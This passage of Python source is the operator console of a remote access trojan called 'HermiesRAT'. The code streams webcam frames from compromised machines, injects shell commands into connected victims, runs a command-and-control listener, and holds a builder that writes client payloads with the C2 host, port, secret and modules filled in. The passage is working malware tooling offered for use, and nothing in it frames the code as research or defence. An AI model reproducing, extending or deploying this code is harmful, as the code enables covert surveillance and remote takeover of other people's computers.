                b64 = resp.get("data")
                if b64: self._cam_push_frame(b64)
        except Exception as e:
            if self._cam_streaming: self.log(f"camera stream error: {e}")
        finally:
            self._cam_streaming = False
            self.after(0, lambda: self._cam_live_btn.configure(text="  START  "))
            self.after(0, lambda: self._cam_fps_lbl.configure(text=""))

    def _cam_push_frame(self, b64, log=False):
        try:
            raw = base64.b64decode(b64); img = Image.open(io.BytesIO(raw))
            self._cam_pil = img
            now = time.time(); self._cam_frame_times.append(now)
            self._cam_frame_times = [t for t in self._cam_frame_times if t >= now - 2.0]
            real_fps = len(self._cam_frame_times) / 2.0
            def _update():
                w = max(self.cam_label.winfo_width(), 200)
                h = max(self.cam_label.winfo_height(), 150)
                thumb = img.copy(); thumb.thumbnail((w, h), Image.LANCZOS)
                tk_img = ImageTk.PhotoImage(thumb)
                self.cam_label.configure(image=tk_img, text="")
                self._cam_image = tk_img
                self._cam_fps_lbl.configure(text=f"{real_fps:.1f} fps")
                if log: self.log("camera: snapshot ok")
            self.after(0, _update)
        except Exception as e:
            if log: self.log(f"camera decode error: {e}")

    def _disconnect(self):
        if self.selected_cid is None: return
        try:
            send_msg(clients[self.selected_cid]["sock"], "exit", None)
            clients[self.selected_cid]["sock"].close()
        except Exception: pass
        with _lock: del clients[self.selected_cid]
        self.selected_cid = None
        self.refresh_clients()
        self.log("disconnected")

    def _task_refresh_target(self):
        T = THEME
        if self.selected_cid is None:
            self._task_target_lbl.configure(text="none selected", fg=T["RED"])
        else:
            info  = clients.get(self.selected_cid, {})
            label = info.get("label", f"id={self.selected_cid}")
            os_   = info.get("os", ""); user_ = info.get("user", "")
            tag   = f"id={self.selected_cid}  {label}"
            if user_: tag += f"  user={user_}"
            if os_:   tag += f"  os={os_}"
            self._task_target_lbl.configure(text=tag, fg=T["GREEN"])

    def _task_load_payload(self, shell, cmd):
        self._task_shell_var.set(shell)
        self._task_cmd_box.delete("1.0", tk.END)
        self._task_cmd_box.insert("1.0", cmd)

    def _task_history_load(self, event=None):
        sel = self._task_history_lb.curselection()
        if not sel: return
        idx = sel[0]
        if idx < len(self._task_history):
            self._task_load_payload(*self._task_history[idx])

    def _task_run(self):
        if self.selected_cid is None:
            self.log("task inject: no target"); self._task_refresh_target(); return
        cmd   = self._task_cmd_box.get("1.0", tk.END).strip()
        shell = self._task_shell_var.get()
        if not cmd: return
        entry = (shell, cmd)
        if entry in self._task_history: self._task_history.remove(entry)
        self._task_history.insert(0, entry); self._task_history = self._task_history[:50]
        self._task_history_lb.delete(0, tk.END)
        for s, c in self._task_history:
            self._task_history_lb.insert(tk.END, f"[{s}] {c.splitlines()[0][:72]}")
        ts = time.strftime("%H:%M:%S")
        self._append(self._task_out_widget,
                     f"\n[{ts}] >> [{shell}] injecting...\n{cmd}\n")
        threading.Thread(target=self._task_worker,
                         args=(clients[self.selected_cid]["sock"], shell, cmd),
                         daemon=True).start()

    def _task_worker(self, sock, shell, cmd):
        tx_b = rx_b = 0
        try:
            payload = json.dumps({"cmd": "shell",
                                  "data": {"shell": shell, "cmd": cmd}}).encode()
            tx_b = len(payload) + 4
            send_msg(sock, "shell", {"shell": shell, "cmd": cmd})
            resp = recv_msg(sock)
            if resp: rx_b = len(json.dumps(resp).encode()) + 4
            out = resp["data"] if resp else "<no response>"
        except Exception as e: out = f"<error: {e}>"
        self._append(self._task_out_widget,
                     f"[{time.strftime('%H:%M:%S')}] << done\n{out}\n{'=' * 60}\n")
        self.log(f"task inject [{shell}] done")
        if self.selected_cid is not None:
            self._dl_record(self.selected_cid, tx_b, rx_b, f"shell/{shell}: {cmd[:60]}")

    def _b_refresh_modules(self):
        T = THEME
        _scan_modules()
        for w in self._b_mod_inner.winfo_children(): w.destroy()
        self._b_mod_vars.clear()
        if not _loaded_modules:
            tk.Label(self._b_mod_inner, text=f"no modules found\n{MODULE_DIR}",
                     bg=T["BG2"], fg=T["FG_DIM"], font=FONT_SML,
                     justify="left").pack(anchor="w", padx=4, pady=4)
            return
        for name, entry in _loaded_modules.items():
            meta = entry["meta"]; var = tk.BooleanVar(value=False)
            self._b_mod_vars[name] = var
            row = tk.Frame(self._b_mod_inner, bg=T["BG2"]); row.pack(fill=tk.X, pady=1)
            cb = tk.Checkbutton(row, variable=var, bg=T["BG2"], fg=T["FG"],
                                selectcolor=T["BG3"], activebackground=T["BG2"],
                                activeforeground=T["ACCENT"], highlightthickness=0, bd=0,
                                command=lambda n=name, m=meta: self._b_mod_desc.configure(
                                    text=f"{n}  v{m.get('version', '?')}\n"
                                         f"{m.get('description', '')}"
                                    + (f"\nparams: {m['params']}" if m.get('params') else "")))
            cb.pack(side=tk.LEFT, padx=(2, 0))
            tk.Label(row, text=name, bg=T["BG2"], fg=T["FG"],
                     font=FONT).pack(side=tk.LEFT, padx=2)
            tk.Label(row, text=meta.get("description", ""), bg=T["BG2"],
                     fg=T["FG_DIM"], font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=4)

    def _b_browse(self):
        path = filedialog.asksaveasfilename(defaultextension=".py",
                                            filetypes=[("Python", "*.py"), ("All", "*.*")])
        if path: self._b_out.delete(0, tk.END); self._b_out.insert(0, path)

    def _b_gen_secret(self):
        new = base64.b64encode(secrets.token_bytes(32)).decode()
        self._b_secret.set(new)
        self._b_status.configure(text="new secret generated build to apply",
                                 fg=THEME["ACCENT2"])

    # lang: Python 3, file: HermiesRAT-Bata-1.py, target: Linux builder
# fix: replace .format() with str.replace() — sidesteps all brace conflicts in template

    def _b_build(self):
        T = THEME
        host   = self._b_host.get().strip()
        port   = self._b_port.get().strip()
        secret = self._b_secret.get().strip()
        retry  = self._b_retry.get().strip()
        out    = self._b_out.get().strip()

        try: port_int = int(port); assert 1 <= port_int <= 65535
        except Exception:
            return self._b_status.configure(text="invalid port", fg=T["RED"])

        try: secret_bytes = secret.encode(); base64.b64decode(secret_bytes)
        except Exception:
            return self._b_status.configure(text="secret must be valid base64", fg=T["RED"])

        try: retry_int = int(retry); assert retry_int >= 1
        except Exception: retry_int = 5

        selected    = [n for n, v in self._b_mod_vars.items() if v.get()]
        module_code = _build_module_injection(selected)

        src = CLIENT_TEMPLATE
        src = src.replace("{c2_host!r}",  repr(host))
        src = src.replace("{c2_port}",    str(port_int))
        src = src.replace("{secret!r}",   repr(secret_bytes))
        src = src.replace("{retry}",      str(retry_int))
        src = src.replace("__MODULE_INJECT__", module_code)
        src = src.replace("{{", "{").replace("}}", "}")  # collapse escaped braces

        mod_summary = (f"  [{len(selected)} module(s): {', '.join(selected)}]"
                       if selected else "")
        try:
            with open(out, "w", encoding="utf-8") as fh: fh.write(src)
            self._b_status.configure(
                text=f"built -> {out}  |  {host}:{port_int}{mod_summary}", fg=T["GREEN"])
            self.log(f"builder: wrote {out}{mod_summary}")
        except Exception as e:
            self._b_status.configure(text=f"write error: {e}", fg=T["RED"])

    def _b_sync_server(self):
        global _active_secret, SHARED_SECRET
        T = THEME
        secret_str = self._b_secret.get().strip()
        try: new_secret = secret_str.encode(); base64.b64decode(new_secret)
        except Exception:
            return messagebox.showerror("sync error", "secret must be valid base64")
        _active_secret = SHARED_SECRET = new_secret
        try: port_int = int(self._b_port.get().strip())
        except Exception: port_int = PORT
        ok = self._restart_listener(port_int)
        if ok:
            self.log(f"server secret synced, listener up on :{port_int}")
            self._b_status.configure(text="secret synced to server", fg=T["GREEN"])
        else:
            self._b_status.configure(text="secret updated listener failed (see log)",
                                     fg=T["RED"])

    def _restart_listener(self, port):
        T = THEME
        if self._srv_sock:
            try: self._srv_sock.close()
            except Exception: pass
            self._srv_sock = None
        last_err = None
        for attempt in range(4):
            if attempt: time.sleep(0.4 * attempt)
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                if hasattr(socket, "SO_REUSEPORT"):
                    try: srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                    except OSError: pass
                srv.bind(("0.0.0.0", port)); srv.listen(16)
                self._srv_sock = srv
                self._status_lbl.configure(text="listening", fg=T["GREEN"])
                self._listen_lbl.configure(text=f"0.0.0.0:{port}")
                threading.Thread(target=accept_loop, args=(srv, self), daemon=True).start()
                return True
            except OSError as e:
                last_err = e
                try: srv.close()
                except Exception: pass
        self._status_lbl.configure(text="server error", fg=T["RED"])
        self._listen_lbl.configure(text="")
        self.log(f"listener error (port {port}): {last_err}")
        self.log(f"  -> kill the process holding :{port}:  kill -9 $(lsof -ti :{port})")
        return False

    def log(self, msg):
        self._append(self._log_widget, f"[{time.strftime('%H:%M:%S')}] {msg}\n")

    def _append(self, widget, text):
        def _do():
            widget.configure(state="normal")
            widget.insert(tk.END, text)
            widget.see(tk.END)
            widget.configure(state="disabled")
        self.after(0, _do)

    def _clear_text(self, widget):
        widget.configure(state="normal")
        widget.delete("1.0", tk.END)
        widget.configure(state="disabled")


#  [ENTRYPOINT]
if __name__ == "__main__":
    _load_config()
    _pc_load()
    app = HermiesGUI()
    if _config.get("db_path"):
        _db_init(_config["db_path"])
        if hasattr(app, "_set_db_status") and _db_conn:
            app._set_db_status.configure(
                text=f"DB connected: {_config['db_path']}", fg=THEME["GREEN"])
    app.log("HermiesRAT starting use BUILDER tab to generate client")
    app.log(f"default listener auto-starts on port {PORT}")
    app._restart_listener(PORT)
    app.mainloop()
    _db_close()
